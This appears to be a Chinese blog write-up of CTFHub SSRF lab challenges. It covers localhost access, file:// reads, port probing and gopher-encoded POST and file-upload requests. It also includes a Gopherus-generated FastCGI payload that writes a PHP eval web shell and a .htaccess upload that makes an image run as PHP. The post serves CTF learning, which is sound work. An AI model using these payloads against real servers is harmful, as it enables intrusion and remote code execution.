---
title: "ctfhub_ssrf基础认证"
date: "2024-07-21"
description: ""
---

![image.png](https://raw.githubusercontent.com/k1t0111/blog/main/image/20240721162712.png)

#### [](#内网访问 "内网访问")内网访问

> 可以看到url 参数部分 出现了熟悉的url 网址访问可以看到可能就是ssrf 的点

\*\*payloads

```shell
url=http://127.0.0.1/flag
```

可以进行内网探测 端口 无果

#### [](#伪协议读取 "伪协议读取")伪协议读取

\*\*payloads

```shell
url=file:///var/www/html/flag.php
```

#### [](#端口扫描 "端口扫描")端口扫描

> hint:来来来性感CTFHub在线扫端口,据说端口范围是8000-9000哦

\*\*payload

```shell
url=http://127.0.0.1:21
```

更换端口去爆破

#### [](#POST传递参数 "POST传递参数")POST传递参数

```php
   <?phperror_reporting(0);if (!isset($_REQUEST['url'])){header("Location: /?url=_");exit;}$ch = curl_init();curl_setopt($ch, CURLOPT_URL, $_REQUEST['url']);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_exec($ch);curl_close($ch);
```

同时查看flag.php

```php
<?phperror_reporting(0);if ($_SERVER["REMOTE_ADDR"] != "127.0.0.1") {    echo "Just View From 127.0.0.1";    return;}$flag=getenv("CTFHUB");$key = md5($flag);if (isset($_POST["key"]) && $_POST["key"] == $key) {    echo $flag;    exit;}?><form action="/flag.php" method="post"><input type="text" name="key"><!-- Debug: key=<?php echo $key;?>--></form>
```

可以看到我们面前遇到了两个问题

1.  直接访问flag.php 但是我们无法突破 127.0.0.1
2.  通过 ssrf的127.0.0.1 访问flag.php 可以解决 但是 我们此时使用常规的http 的post传递 传递的 参数是给的index.php 无法达到给flag.php

\*\*解决:

gopher协议,以前的旧协议，被http给替代掉了可以发一个post包  
但是需要编码，两次url 编码  
第一次编码结束之后需要把%0A 替换为 %0D%0A再进行第二次编码  
![image.png](https://raw.githubusercontent.com/k1t0111/blog/main/image/20240705200628.png)

payloads

```shell
gopher%3A//127.0.0.1%3A80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%252036%250D%250A%250D%250Akey%253D01f842aefb9fde52ab9363bc95bbdd5%250D%250A
```

> 其实既然我在想 他限制了我使用post传递参数我就在想我如果不用post传递参数我使用get传递是不是也可以不用gopher 直接用post

![image.png](https://raw.githubusercontent.com/k1t0111/blog/main/image/20240705202113.png)  
于是改了一下源码  
![image.png](https://raw.githubusercontent.com/k1t0111/blog/main/image/20240705202113.png)

[http://vul.com/?url=http://127.0.0.1/flag.php?key=d41d8cd98f00b204e9800998ecf8427e](http://vul.com/?url=http://127.0.0.1/flag.php?key=d41d8cd98f00b204e9800998ecf8427e)  
事实证明其实我想错了 其实get传递参数还是给了index.php  
所以还是要用gopher协议

### [](#文件上传 "文件上传")文件上传

> 可以看到依旧是跟上一个是一样的都是需要一个 gopher 跟随我们的ssrf 伪造从内网发包访问  
> 注意之前提到的我们的上传文件的一些问题

\*\*payload

```shell
http://challenge-c55a62e9fd3d11d7.sandbox.ctfhub.com:10800/?url=gopher%3A//127.0.0.1%3A80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520challenge-c55a62e9fd3d11d7.sandbox.ctfhub.com%253A10800%250D%250AContent-Length%253A%2520377%250D%250AContent-Type%253A%2520multipart/form-data%253B%2520boundary%253D----WebKitFormBoundaryzAyIHFg5lQfDlecU%250D%250A%250D%250A------WebKitFormBoundaryzAyIHFg5lQfDlecU%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522file%2522%253B%2520filename%253D%2522.htaccess%2522%250D%250AContent-Type%253A%2520application/octet-stream%250D%250A%250D%250A%253CFilesMatch%2520%25221.jpg%2522%253E%250D%250A%250D%250A%2520%2520SetHandler%2520application/x-httpd-php%250D%250A%250D%250A%253C/FilesMatch%253E%250D%250A%250D%250A%250D%250A------WebKitFormBoundaryzAyIHFg5lQfDlecU%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522submit%2522%250D%250A%250D%250A%25E6%258F%2590%25E4%25BA%25A4%250D%250A------WebKitFormBoundaryzAyIHFg5lQfDlecU--%250D%250A
```

### [](#fastcgi "fastcgi")fastcgi

> 可以看到我们需要打fastcgi  
> 这里需要设置一些详细设置

必备条件

[FastCGI协议](%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/top10%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/ssrf/SSRF.md#FastCGI%E5%8D%8F%E8%AE%AE)

直接使用工具开打[gopher](https://github.com/tarunkant/Gopherus) 但是需要知道一些php文件的路径才能利用  
最直接的 /var/www/html/index.php  
因此可以生成  
\*\*paylods

```shell
Give one file name which should be surely present in the server (prefer .php file)                                                          if you don't know press ENTER we have default one:  /var/www/html/index.phpTerminal command to run:  echo "<?php eval($_POST['cmd']);?>" > /var/www/shell.phpYour gopher link is ready to do SSRF:                                                                                                       gopher%3A%2F%2F127.0.0.1%3A9000%2F_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2505%2505%2500%250F%2510SERVER_SOFTWAREgo%2520%2F%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP%2F1.1%250E%2503CONTENT_LENGTH108%250E%2504REQUEST_METHODPOST%2509KPHP_VALUEallow_url_include%2520%253D%2520On%250Adisable_functions%2520%253D%2520%250Aauto_prepend_file%2520%253D%2520php%253A%2F%2Finput%250F%2517SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Findex.php%250D%2501DOCUMENT_ROOT%2F%2500%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%2500l%2504%2500%253C%253Fphp%2520system%2528%2527echo%2520%2522%253C%253Fphp%2520eval%2528%2524_POST%255B%2527cmd%2527%255D%2529%253B%253F%253E%2522%2520%253E%2520%2Fvar%2Fwww%2Fshell.php%2527%2529%253Bdie%2528%2527
```

### [](#Redis "Redis")Redis

继续使用gopher协议，详解可以关注个人博客[https://k1t0111.github.io](https://k1t0111.github.io/)  
其实如果不详细分析的话，我们直接使用gopherus 工具直接打  
gopherus –exploit redis 可以直接出payload
